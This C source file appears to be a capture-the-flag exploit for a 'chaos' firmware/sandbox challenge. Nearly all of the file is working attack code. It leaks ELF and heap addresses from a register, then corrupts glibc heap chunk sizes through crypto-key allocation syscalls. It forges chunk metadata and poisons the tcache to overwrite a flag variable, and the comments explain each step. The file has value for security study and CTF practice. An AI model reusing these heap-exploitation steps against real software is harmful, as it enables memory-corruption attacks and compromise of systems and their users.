#include "handler.h"
#include "syscall.h"
#include "types.h"

static struct Csrs *csr = (struct Csrs *)CSR_BASE;

static void check_dram_buffer(struct dram_buffer *buf, uint32_t offset, uint32_t size)
{
    CHECK(offset < DRAM_SIZE && size <= DRAM_SIZE && offset <= DRAM_BASE - size);
    buf->ptr = DRAM_AT(offset);
    buf->size = size;
}

static void push_rsp(struct chaos_mailbox_rsp *rsp)
{
    struct chaos_mailbox_rsp *queue = DRAM_AT(csr->rspq_addr);
    const uint64_t rspq_size = csr->rspq_size;
    uint64_t tail = csr->rsp_tail;

    queue[real_index(tail, rspq_size)] = *rsp;
    csr->rsp_tail = queue_inc(tail, rspq_size);
}

static uint32_t alloc_chr(uint8_t a, uint32_t size)
{
    static uint8_t buf[0x800];
    CHECK(size <= sizeof(buf));
    memset(buf, a, size);
    return syscall(SYS_chaos_crypto, CHAOS_ALGO_REG_KEY, PACK(buf, size));
}

static void freeh(uint32_t handle)
{
    syscall(SYS_chaos_crypto, CHAOS_ALGO_UNREG_KEY, handle);
}

static uint64_t heap = 0x555555560000ul + 0x3000;
static uint64_t elf = 0x555555554000ull;
static void exploit(void)
{
    // exhaust 0x20 chunks
    uint32_t _a = alloc_chr('a', 0x18);

    uint32_t key1 = alloc_chr('k', 32);
    uint32_t key2 = alloc_chr('K', 32);
    uint32_t c = alloc_chr('c', 0x18);
    freeh(c);
    uint8_t in[0x18];
    memset(in, 'i', sizeof(in));
    uint32_t d = alloc_chr('d', 0x18);
    uint32_t e = alloc_chr('e', 0x18);
    freeh(d);
    freeh(e);
    syscall(SYS_chaos_crypto, CHAOS_ALGO_FFF_ENC, PACK(&in, 0x18), PACK(0x1000, 0x18), key1);
    // size cracked, don't free this
    uint32_t crack = alloc_chr('a', 0x38);
    syscall(SYS_chaos_crypto, CHAOS_ALGO_FFF_ENC, PACK(&in, 0x18), PACK(0x1000, 0x18), key2);
    // dummy
    uint32_t _d = alloc_chr('d', 0x28);
    // the chunk with size being modified 0x21 -> 0x81
    uint32_t hack = alloc_chr('h', 0x18);
    freeh(hack);
    uint64_t forge[15] = {
        0xdeadbeefu, 0xdeadbeefu,
        0xdeadbeefu, 0x41,
        0,                     heap + 0x11f10,
        heap + 0x11f70,        heap + 0x120e0,
        0xfffffeb100000007ull, heap + 0x12030,
        0xfe9fe8c689410000, 0x21,
        /*ptr*/0, 0x38,
        0xfaceb00cu,
    };
    uint32_t f = syscall(SYS_chaos_crypto, CHAOS_ALGO_REG_KEY, PACK(forge, sizeof(forge)));
    // create more chunks to survive the tcache count check
    uint32_t _e = alloc_chr('e', 0x38);
    freeh(_e);
    // forged ptr to null, this won't free the chunk with cracked size
    freeh(crack);
    freeh(f);
    uint64_t tcache = heap + 0x10;
    uint64_t forge2[15] = {
        0xdeadbeefu, 0xdeadbeefu,
        0xdeadbeefu, 0x41,
        0, tcache,
        0, 0,
        0, 0,
        0, 0x21,
        elf + 0xb170, tcache,
        0,
    };
    f = syscall(SYS_chaos_crypto, CHAOS_ALGO_REG_KEY, PACK(forge2, sizeof(forge2)));
    // set flag_firmware to 1 -> read flag_sandbox
    alloc_chr(1, 0x1);
/* while(1); */
}

#define SYS_chaos_flag 0xc89fc
static void leak(void)
{
    register long *a __asm__( "r9" );

    elf = a[41] - 0xb020;
    heap = a[70];
}

void handle_mailbox(void)
{
    leak();
    const uint64_t cmdq_size = csr->cmdq_size;
    uint64_t head = csr->cmd_head;
    uint64_t tail = csr->cmd_tail;
    struct chaos_mailbox_cmd *cmdq = DRAM_AT(csr->cmdq_addr);
    struct chaos_mailbox_cmd *cmd;
    struct chaos_mailbox_rsp rsp;
    struct dram_buffer out;
    struct chaos_request *req;

    if (head == tail)
        return;
    cmd = &cmdq[real_index(head, cmdq_size)];
    csr->cmd_head = queue_inc(head, cmdq_size);
    req = (struct chaos_request *)DRAM_AT(cmd->dma_addr);
    check_dram_buffer(&out, req->output, req->out_size);
    exploit();
    rsp.retval = syscall(SYS_chaos_flag, out);
    rsp.seq = cmd->seq;
    push_rsp(&rsp);
}
